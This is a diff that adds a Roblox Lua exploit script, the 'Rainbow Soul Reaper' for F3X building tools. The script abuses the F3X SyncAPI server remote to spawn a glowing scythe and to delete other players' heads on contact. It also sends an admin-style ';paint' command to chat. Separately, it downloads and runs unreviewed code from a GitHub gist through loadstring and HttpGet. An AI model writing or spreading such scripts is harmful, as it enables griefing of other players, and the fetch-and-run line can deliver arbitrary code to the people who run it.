@@ -1,0 +1,116 @@
+-- [[ RAINBOW SOUL REAPER - F3X VERSION ]]
+
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- 1. SETUP BTOOLS
+local function getTool()
+    for _, v in pairs(player:GetDescendants()) do if v.Name == "SyncAPI" then return v.Parent end end
+    return nil
+end
+
+local tool = getTool()
+if not tool then warn("Equip F3X first!") return end
+local remote = tool.SyncAPI.ServerEndpoint
+local function _(args) remote:InvokeServer(unpack(args)) end
+
+-- 2. CREATE SCYTHE PARTS
+local Scythe1 = remote:InvokeServer("CreatePart","Normal",char.HumanoidRootPart.CFrame,char)
+local NeonPart = remote:InvokeServer("CreatePart","Normal",char.HumanoidRootPart.CFrame,char)
+
+-- Initial Setup
+task.spawn(function()
+    _({"SetName", {Scythe1}, "Scythe1"})
+    _({"CreateMeshes", {{Part = Scythe1}}})
+    _({"SyncMesh", {{Part = Scythe1, MeshId = "rbxassetid://134254117607114"}}})
+    _({"SyncColor", {{Part = Scythe1, Color = Color3.new(0,0,0)}}})
+    _({"SyncCollision", {{Part = Scythe1, CanCollide = false}}})
+    _({"SyncResize", {{Part = Scythe1, Size = Vector3.new(8.5, 0.6, 7.8), CFrame = Scythe1.CFrame}}})
+end)
+
+task.spawn(function()
+    _({"SetName", {NeonPart}, "NeonPart"})
+    _({"CreateMeshes", {{Part = NeonPart}}})
+    _({"SyncMesh", {{Part = NeonPart, MeshId = "rbxassetid://108303781621285"}}})
+    _({"SyncMaterial", {{Part = NeonPart, Material = Enum.Material.Neon}}})
+    _({"SyncCollision", {{Part = NeonPart, CanCollide = false}}})
+    _({"SyncResize", {{Part = NeonPart, Size = Vector3.new(8.5, 0.6, 7.8), CFrame = NeonPart.CFrame}}})
+    _({"CreateLights", {{Part = NeonPart, LightType = "PointLight"}}})
+end)
+
+-- 3. RAINBOW LOOP (The Magic Part)
+task.spawn(function()
+    while task.wait(0.1) do -- Adjusted speed so F3X doesn't lag out
+        local hue = (tick() % 5) / 5
+        local rainbowColor = Color3.fromHSV(hue, 1, 1)
+        
+        -- Update the Glow and the Light via F3X Remotes
+        _({"SyncColor", {{Part = NeonPart, Color = rainbowColor}}})
+        _({"SyncLighting", {{Part = NeonPart, LightType = "PointLight", Color = rainbowColor, Range = 12, Brightness = 8}}})
+    end
+end)
+
+-- 4. ANIMATION & POSITIONING (Rest of your original logic)
+task.defer(function()
+    loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/2c02b92a4e32c552566962c8e2d42284/raw/b6ca0a5626e8494e858eaeab5c9c7bf082444c28/soulreaper"))()
+end)
+
+game:GetService("RunService").Heartbeat:Connect(function()
+    if not char:FindFirstChild("Scythe") then return end
+    local targetPart = char.Scythe:FindFirstChildOfClass("Part") or char.Scythe:GetChildren()[2]
+    if targetPart then
+        local mainCF = targetPart.CFrame * CFrame.new(3.2, -0.5, 0.2)
+        _({"SyncMove", {{Part = Scythe1, CFrame = mainCF}}})
+        _({"SyncMove", {{Part = NeonPart, CFrame = mainCF}}})
+    end
+end)
+
+-- Kill logic stays the same as your original script
+-- این تابع پیام‌ها رو مستقیماً توی چت می‌نویسه
+local function SendToChat(message)
+    local TextChatService = game:GetService("TextChatService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        if channel then
+            channel:SendAsync(message)
+        end
+    else
+        local sayEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if sayEvents and sayEvents:FindFirstChild("SayMessageRequest") then
+            sayEvents.SayMessageRequest:FireServer(message, "All")
+        end
+    end
+end
+
+-- حالا هر وقت بخواد کسی رو بکشه، فقط تو چت دستور میده
+local function doKill(targetPlayer)
+    if targetPlayer and targetPlayer.Character then
+        -- ارسال دستور ادمین به چت
+        SendToChat(";paint " .. targetPlayer.Name .. " black")
+        
+        -- حذف کردن سر هدف
+        local targetHead = targetPlayer.Character:FindFirstChild("Head")
+        if targetHead then 
+            _({"Remove", {targetHead}}) 
+        end
+    end
+end
+
+game:GetService("UserInputService").InputBegan:Connect(function(input, processed)
+    if processed then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        local connection
+        connection = Scythe1.Touched:Connect(function(hit)
+            local enemy = game.Players:GetPlayerFromCharacter(hit.Parent)
+            if enemy and enemy ~= player then
+                connection:Disconnect()
+                doKill(enemy)
+            end
+        end)
+        task.wait(0.7)
+        if connection then connection:Disconnect() end
+    end
+end)
